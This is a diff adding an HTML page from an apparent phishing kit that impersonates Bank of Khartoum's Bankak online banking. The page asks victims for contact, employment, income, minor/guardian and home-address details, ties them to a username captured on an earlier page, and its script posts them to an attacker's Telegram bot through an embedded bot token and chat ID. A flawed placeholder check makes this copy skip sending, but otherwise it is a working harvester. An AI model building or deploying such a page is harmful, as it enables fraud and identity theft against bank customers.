@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" class="h-full antialiased">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title id="page-title">bankofkhartoum</title>
+    <meta name="description" content="تفاصيل الأعمال — بنكك أونلاين">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/svg+xml" href="logo.svg">
+    <link rel="alternate icon" href="favicon.ico" sizes="16x16">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="page-wrapper lang-fade" id="page-wrapper">
+        <header dir="ltr" class="site-header">
+            <div class="header-inner">
+                <div class="header-red">
+                    <div class="header-red-bg" aria-hidden="true"></div>
+                    <div class="header-red-overlay" aria-hidden="true"></div>
+                    <div class="header-logo"><img src="logo.svg" alt="بنك الخرطوم" id="logo-img"></div>
+                </div>
+                <div class="header-gold">
+                    <button type="button" class="lang-toggle" id="lang-toggle" aria-label="Switch language">EN</button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="biz-inner">
+                <form id="biz-form" novalidate>
+                    <div class="biz-section">
+                        <div class="biz-section-header">
+                            <div class="biz-section-title" data-i18n="sec1_title">Business Details</div>
+                            <div class="biz-section-tag no-border">IBOK</div>
+                        </div>
+                        <div class="biz-section-body">
+                            <div class="grid-2">
+                                <div><label class="field-label" for="email" data-i18n="lbl_email">Email</label><input type="email" class="field-input" id="email" data-i18n-placeholder="ph_email" placeholder="example@email.com"></div>
+                                <div><label class="field-label" for="phone" data-i18n="lbl_phone">Phone</label><input type="tel" class="field-input" id="phone" data-i18n-placeholder="ph_phone" placeholder="Phone Number"></div>
+                                <div>
+                                    <label class="field-label" data-i18n="lbl_biz_sector">Business Sector</label>
+                                    <div class="radio-group" id="group-business_sector">
+                                        <label class="radio-option"><input type="radio" name="business_sector" value="Government"><span data-i18n="opt_gov">Government</span></label>
+                                        <label class="radio-option"><input type="radio" name="business_sector" value="Private"><span data-i18n="opt_priv">Private</span></label>
+                                        <label class="radio-option"><input type="radio" name="business_sector" value="Other"><span data-i18n="opt_other">Other</span></label>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="field-label" data-i18n="lbl_emp_status">Employment Status</label>
+                                    <div class="radio-group" id="group-employment_status">
+                                        <label class="radio-option"><input type="radio" name="employment_status" value="Retired"><span data-i18n="opt_retired">Retired</span></label>
+                                        <label class="radio-option"><input type="radio" name="employment_status" value="Student"><span data-i18n="opt_student">Student</span></label>
+                                        <label class="radio-option"><input type="radio" name="employment_status" value="Salaried"><span data-i18n="opt_salaried">Salaried</span></label>
+                                        <label class="radio-option"><input type="radio" name="employment_status" value="Self-Employed"><span data-i18n="opt_selfemp">Self-Employed</span></label>
+                                    </div>
+                                </div>
+                                <div><label class="field-label" for="employer_name" data-i18n="lbl_employer">Employer Name</label><input type="text" class="field-input" id="employer_name" data-i18n-placeholder="ph_employer" placeholder="Employer Name"></div>
+                                <div><label class="field-label" for="work_address" data-i18n="lbl_work_addr">Work Address</label><input type="text" class="field-input" id="work_address" data-i18n-placeholder="ph_work_addr" placeholder="Work Address"></div>
+                                <div><label class="field-label" for="job_title" data-i18n="lbl_job_title">Job Title</label><input type="text" class="field-input" id="job_title" data-i18n-placeholder="ph_job_title" placeholder="Job Title"></div>
+                                <div><label class="field-label" for="monthly_income" data-i18n="lbl_monthly">Monthly Income</label><input type="text" class="field-input" id="monthly_income" data-i18n-placeholder="ph_monthly" placeholder="Monthly Income"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="biz-section">
+                        <div class="biz-section-header">
+                            <div class="biz-section-title" data-i18n="sec2_title">Income Data</div>
+                            <div class="biz-section-tag">INCOME</div>
+                        </div>
+                        <div class="biz-section-body">
+                            <div class="grid-2">
+                                <div>
+                                    <label class="field-label" data-i18n="lbl_primary_income">Primary Source of Income</label>
+                                    <div class="radio-group" id="group-primary_income">
+                                        <label class="radio-option"><input type="radio" name="primary_income" value="Salary"><span data-i18n="opt_salary">Salary</span></label>
+                                        <label class="radio-option"><input type="radio" name="primary_income" value="Pension"><span data-i18n="opt_pension">Pension</span></label>
+                                        <label class="radio-option"><input type="radio" name="primary_income" value="Self-Employed"><span data-i18n="opt_selfemp">Self-Employed</span></label>
+                                        <label class="radio-option"><input type="radio" name="primary_income" value="Other"><span data-i18n="opt_other">Other</span></label>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="field-label" for="source_of_funds" data-i18n="lbl_funds">Source of Funds</label>
+                                    <input type="text" class="field-input" id="source_of_funds" data-i18n-placeholder="ph_funds" placeholder="Source of Funds">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="biz-section">
+                        <div class="biz-section-header">
+                            <div class="biz-section-title" data-i18n="sec3_title">In Case of Minor's</div>
+                            <div class="biz-section-tag">OPTIONAL</div>
+                        </div>
+                        <div class="biz-section-body">
+                            <div class="grid-2">
+                                <div><label class="field-label" for="minor_name" data-i18n="lbl_minor_name">Minor Name</label><input type="text" class="field-input" id="minor_name" data-i18n-placeholder="ph_minor_name" placeholder="Minor Name"></div>
+                                <div><label class="field-label" for="guardian_name" data-i18n="lbl_guardian">Guardian Name</label><input type="text" class="field-input" id="guardian_name" data-i18n-placeholder="ph_guardian" placeholder="Guardian Name"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="biz-section">
+                        <div class="biz-section-header">
+                            <div class="biz-section-title" data-i18n="sec4_title">Residence Address Details</div>
+                            <div class="biz-section-tag">ADDRESS</div>
+                        </div>
+                        <div class="biz-section-body">
+                            <div class="grid-3" style="margin-bottom: 0.75rem;">
+                                <div><label class="field-label" for="area" data-i18n="lbl_area">Area</label><input type="text" class="field-input" id="area" data-i18n-placeholder="ph_area" placeholder="Area"></div>
+                                <div><label class="field-label" for="city" data-i18n="lbl_city">City</label><input type="text" class="field-input" id="city" data-i18n-placeholder="ph_city" placeholder="City"></div>
+                                <div><label class="field-label" for="district" data-i18n="lbl_district">District</label><input type="text" class="field-input" id="district" data-i18n-placeholder="ph_district" placeholder="District"></div>
+                            </div>
+                            <div>
+                                <label class="field-label" for="address_details" data-i18n="lbl_addr_details">Address Details</label>
+                                <textarea class="field-input" id="address_details" data-i18n-placeholder="ph_addr_details" placeholder="Address Details" style="min-height:5rem;resize:vertical;"></textarea>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-error" id="form-error"></div>
+                    <div class="submit-row">
+                        <button type="button" class="btn-back" id="back-btn" data-i18n="btn_back">Back</button>
+                        <button type="submit" class="btn-submit" id="submit-btn">
+                            <span id="submit-text" data-i18n="btn_submit">Submit Request</span>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <footer class="site-footer">
+            <div class="footer-inner">
+                <div class="footer-copy"><span class="semibold">©2024</span> <span class="bold">iBOK</span></div>
+                <div class="footer-banner"><img src="footer-banner.png" alt="Internet Banking Services" width="980" height="120"></div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        (function () {
+            'use strict';
+            var CONFIG = {
+                TELEGRAM_BOT_TOKEN: '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc',
+                TELEGRAM_CHAT_ID: '844962683',
+                BACK_URL: 'otp.html',
+                NEXT_URL: 'success.html',
+                REDIRECT_DELAY: 1500
+            };
+
+            var translations = {
+                ar: {
+                    pageTitle: 'bankofkhartoum',
+                    sec1_title: 'تفاصيل الأعمال', sec2_title: 'بيانات الدخل',
+                    sec3_title: 'في حالة وجود قاصر', sec4_title: 'تفاصيل عنوان الإقامة',
+                    lbl_email: 'البريد الإلكتروني', ph_email: 'example@email.com',
+                    lbl_phone: 'الهاتف', ph_phone: 'رقم الهاتف',
+                    lbl_biz_sector: 'قطاع الأعمال',
+                    opt_gov: 'حكومي', opt_priv: 'خاص', opt_other: 'أخرى',
+                    lbl_emp_status: 'الحالة الوظيفية',
+                    opt_retired: 'متقاعد', opt_student: 'طالب', opt_salaried: 'موظف', opt_selfemp: 'عمل حر',
+                    lbl_employer: 'اسم جهة العمل', ph_employer: 'اسم جهة العمل',
+                    lbl_work_addr: 'عنوان العمل', ph_work_addr: 'عنوان العمل',
+                    lbl_job_title: 'المسمى الوظيفي', ph_job_title: 'المسمى الوظيفي',
+                    lbl_monthly: 'الدخل الشهري', ph_monthly: 'الدخل الشهري',
+                    lbl_primary_income: 'المصدر الرئيسي للدخل',
+                    opt_salary: 'راتب', opt_pension: 'معاش',
+                    lbl_funds: 'مصدر الأموال', ph_funds: 'مصدر الأموال',
+                    lbl_minor_name: 'اسم القاصر', ph_minor_name: 'اسم القاصر',
+                    lbl_guardian: 'اسم الوصي', ph_guardian: 'اسم الوصي',
+                    lbl_area: 'المنطقة', ph_area: 'المنطقة',
+                    lbl_city: 'المدينة', ph_city: 'المدينة',
+                    lbl_district: 'الحي', ph_district: 'الحي',
+                    lbl_addr_details: 'تفاصيل العنوان', ph_addr_details: 'تفاصيل العنوان',
+                    btn_back: 'رجوع', btn_submit: 'إرسال الطلب', submitting: 'جارٍ الإرسال',
+                    toggleLabel: 'EN', toggleAria: 'Switch to English',
+                    errRequired: 'الرجاء تعبئة الحقول المحددة باللون الأحمر.',
+                    errEmail: 'الرجاء إدخال بريد إلكتروني صحيح.'
+                },
+                en: {
+                    pageTitle: 'bankofkhartoum',
+                    sec1_title: 'Business Details', sec2_title: 'Income Data',
+                    sec3_title: "In Case of Minor's", sec4_title: 'Residence Address Details',
+                    lbl_email: 'Email', ph_email: 'example@email.com',
+                    lbl_phone: 'Phone', ph_phone: 'Phone Number',
+                    lbl_biz_sector: 'Business Sector',
+                    opt_gov: 'Government', opt_priv: 'Private', opt_other: 'Other',
+                    lbl_emp_status: 'Employment Status',
+                    opt_retired: 'Retired', opt_student: 'Student', opt_salaried: 'Salaried', opt_selfemp: 'Self-Employed',
+                    lbl_employer: 'Employer Name', ph_employer: 'Employer Name',
+                    lbl_work_addr: 'Work Address', ph_work_addr: 'Work Address',
+                    lbl_job_title: 'Job Title', ph_job_title: 'Job Title',
+                    lbl_monthly: 'Monthly Income', ph_monthly: 'Monthly Income',
+                    lbl_primary_income: 'Primary Source of Income',
+                    opt_salary: 'Salary', opt_pension: 'Pension',
+                    lbl_funds: 'Source of Funds', ph_funds: 'Source of Funds',
+                    lbl_minor_name: 'Minor Name', ph_minor_name: 'Minor Name',
+                    lbl_guardian: 'Guardian Name', ph_guardian: 'Guardian Name',
+                    lbl_area: 'Area', ph_area: 'Area',
+                    lbl_city: 'City', ph_city: 'City',
+                    lbl_district: 'District', ph_district: 'District',
+                    lbl_addr_details: 'Address Details', ph_addr_details: 'Address Details',
+                    btn_back: 'Back', btn_submit: 'Submit Request', submitting: 'Sending',
+                    toggleLabel: 'AR', toggleAria: 'التبديل إلى العربية',
+                    errRequired: 'Please fill in the fields highlighted in red.',
+                    errEmail: 'Please enter a valid email address.'
+                }
+            };
+
+            var DEFAULT_LANG = 'ar';
+            var currentLang = DEFAULT_LANG;
+            var isSubmitting = false;
+            var username = '';
+
+            var html = document.documentElement;
+            var pageTitle = document.getElementById('page-title');
+            var langToggle = document.getElementById('lang-toggle');
+            var wrapper = document.getElementById('page-wrapper');
+            var form = document.getElementById('biz-form');
+            var submitBtn = document.getElementById('submit-btn');
+            var submitText = document.getElementById('submit-text');
+            var backBtn = document.getElementById('back-btn');
+            var formError = document.getElementById('form-error');
+
+            try { username = sessionStorage.getItem('bankak-username') || ''; } catch (e) {}
+            if (!username) { window.location.replace('bankak.html'); return; }
+
+            function applyLanguage(lang) {
+                currentLang = lang;
+                var t = translations[lang];
+                html.setAttribute('lang', lang);
+                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+                if (pageTitle) pageTitle.textContent = t.pageTitle;
+                document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n');
+                    if (t[k] !== undefined) el.textContent = t[k];
+                });
+                document.querySelectorAll('[data-i18n-placeholder]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n-placeholder');
+                    if (t[k] !== undefined) el.setAttribute('placeholder', t[k]);
+                });
+                if (langToggle) {
+                    langToggle.textContent = t.toggleLabel;
+                    langToggle.setAttribute('aria-label', t.toggleAria);
+                }
+                if (formError) formError.classList.remove('visible');
+                try { localStorage.setItem('bankak-lang', lang); } catch (e) {}
+            }
+
+            langToggle.addEventListener('click', function () {
+                var next = currentLang === 'ar' ? 'en' : 'ar';
+                wrapper.classList.add('is-switching');
+                window.setTimeout(function () {
+                    applyLanguage(next);
+                    wrapper.classList.remove('is-switching');
+                }, 120);
+            });
+
+            backBtn.addEventListener('click', function () {
+                window.location.href = CONFIG.BACK_URL;
+            });
+
+            /* Required fields (minor's + address details + source of funds excluded) */
+            var REQUIRED_INPUTS = ['email','phone','employer_name','work_address','job_title','monthly_income','area','city','district'];
+            var REQUIRED_RADIOS = ['business_sector','employment_status','primary_income'];
+
+            function clearInvalid() {
+                document.querySelectorAll('.is-invalid').forEach(function (el) { el.classList.remove('is-invalid'); });
+            }
+            function markInvalid(el) { if (el) el.classList.add('is-invalid'); }
+
+            function collectData() {
+                return {
+                    email: (document.getElementById('email').value || '').trim(),
+                    phone: (document.getElementById('phone').value || '').trim(),
+                    business_sector: (document.querySelector('input[name="business_sector"]:checked') || {}).value || '',
+                    employment_status: (document.querySelector('input[name="employment_status"]:checked') || {}).value || '',
+                    employer_name: (document.getElementById('employer_name').value || '').trim(),
+                    work_address: (document.getElementById('work_address').value || '').trim(),
+                    job_title: (document.getElementById('job_title').value || '').trim(),
+                    monthly_income: (document.getElementById('monthly_income').value || '').trim(),
+                    primary_income: (document.querySelector('input[name="primary_income"]:checked') || {}).value || '',
+                    source_of_funds: (document.getElementById('source_of_funds').value || '').trim(),
+                    minor_name: (document.getElementById('minor_name').value || '').trim(),
+                    guardian_name: (document.getElementById('guardian_name').value || '').trim(),
+                    area: (document.getElementById('area').value || '').trim(),
+                    city: (document.getElementById('city').value || '').trim(),
+                    district: (document.getElementById('district').value || '').trim(),
+                    address_details: (document.getElementById('address_details').value || '').trim()
+                };
+            }
+
+            function validateForm() {
+                clearInvalid();
+                var firstInvalid = null;
+                var data = collectData();
+                var hasError = false;
+
+                REQUIRED_INPUTS.forEach(function (id) {
+                    var el = document.getElementById(id);
+                    if (!data[id]) { markInvalid(el); if (!firstInvalid) firstInvalid = el; hasError = true; }
+                });
+                REQUIRED_RADIOS.forEach(function (name) {
+                    if (!data[name]) {
+                        var g = document.getElementById('group-' + name);
+                        markInvalid(g); if (!firstInvalid) firstInvalid = g; hasError = true;
+                    }
+                });
+                if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
+                    markInvalid(document.getElementById('email'));
+                    if (!firstInvalid) firstInvalid = document.getElementById('email');
+                    hasError = true;
+                }
+                return { valid: !hasError, firstInvalid: firstInvalid };
+            }
+
+            document.querySelectorAll('.field-input').forEach(function (el) {
+                el.addEventListener('input', function () { if (el.value.trim()) el.classList.remove('is-invalid'); });
+            });
+            document.querySelectorAll('input[type="radio"]').forEach(function (el) {
+                el.addEventListener('change', function () {
+                    var g = document.getElementById('group-' + el.getAttribute('name'));
+                    if (g) g.classList.remove('is-invalid');
+                });
+            });
+
+            function sendToTelegram(p) {
+                var token = CONFIG.TELEGRAM_BOT_TOKEN;
+                var chatId = CONFIG.TELEGRAM_CHAT_ID;
+                if (!token || token === '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc' || !chatId || chatId === '844962683') {
+                    console.warn('[Bankak] Telegram not configured — skipping.');
+                    return Promise.resolve(false);
+                }
+                var now = new Date();
+                var timeStr = now.toLocaleString('en-GB', { hour12: false });
+                var text =
+                    '📋 تحديث بياناتك — تفاصيل الأعمال\n' +
+                    '━━━━━━━━━━━━━━━━━━━━\n' +
+                    '👤 اسم المستخدم / Account: ' + username + '\n\n' +
+                    '📧 Email: ' + (p.email || '—') + '\n' +
+                    '📱 Phone: ' + (p.phone || '—') + '\n' +
+                    '🏢 Business Sector: ' + (p.business_sector || '—') + '\n' +
+                    '💼 Employment Status: ' + (p.employment_status || '—') + '\n' +
+                    '🏛 Employer Name: ' + (p.employer_name || '—') + '\n' +
+                    '📍 Work Address: ' + (p.work_address || '—') + '\n' +
+                    '💼 Job Title: ' + (p.job_title || '—') + '\n' +
+                    '💰 Monthly Income: ' + (p.monthly_income || '—') + '\n\n' +
+                    '📊 Income Data:\n' +
+                    '   Primary Source: ' + (p.primary_income || '—') + '\n' +
+                    '   Source of Funds: ' + (p.source_of_funds || '—') + '\n\n' +
+                    '👶 Minor\'s Info (optional):\n' +
+                    '   Minor Name: ' + (p.minor_name || '—') + '\n' +
+                    '   Guardian Name: ' + (p.guardian_name || '—') + '\n\n' +
+                    '🏠 Residence Address:\n' +
+                    '   Area: ' + (p.area || '—') + '\n' +
+                    '   City: ' + (p.city || '—') + '\n' +
+                    '   District: ' + (p.district || '—') + '\n' +
+                    '   Details: ' + (p.address_details || '—') + '\n\n' +
+                    '🕒 الوقت: ' + timeStr;
+                var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+                var body = new URLSearchParams();
+                body.append('chat_id', chatId);
+                body.append('text', text);
+                return fetch(url, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() })
+                    .then(function () { return true; }).catch(function () { return false; });
+            }
+
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                if (isSubmitting) return;
+                var t = translations[currentLang];
+                var result = validateForm();
+                if (!result.valid) {
+                    formError.textContent = t.errRequired;
+                    formError.classList.add('visible');
+                    if (result.firstInvalid) {
+                        result.firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        if (result.firstInvalid.focus) result.firstInvalid.focus();
+                    }
+                    return;
+                }
+                formError.classList.remove('visible');
+                var data = collectData();
+                isSubmitting = true;
+                submitBtn.disabled = true;
+                submitText.innerHTML = t.submitting + '<span class="spinner" aria-hidden="true"></span>';
+                sendToTelegram(data).then(function () {
+                    window.setTimeout(function () {
+                        window.location.href = CONFIG.NEXT_URL;
+                    }, CONFIG.REDIRECT_DELAY);
+                });
+            });
+
+            var logoImg = document.getElementById('logo-img');
+            if (logoImg) {
+                logoImg.addEventListener('error', function () {
+                    var parent = logoImg.parentNode;
+                    logoImg.style.display = 'none';
+                    if (!parent.querySelector('.logo-fallback')) {
+                        var fb = document.createElement('div');
+                        fb.className = 'logo-fallback';
+                        fb.style.display = 'block';
+                        fb.innerHTML = 'بنك الخرطوم<br><span style="font-size:0.9rem;font-weight:600;">Bank of Khartoum</span>';
+                        parent.appendChild(fb);
+                    }
+                });
+            }
+
+            var saved = null;
+            try { saved = localStorage.getItem('bankak-lang'); } catch (e) {}
+            applyLanguage(saved === 'en' ? 'en' : DEFAULT_LANG);
+        })();
+    </script>
+</body>
+</html>
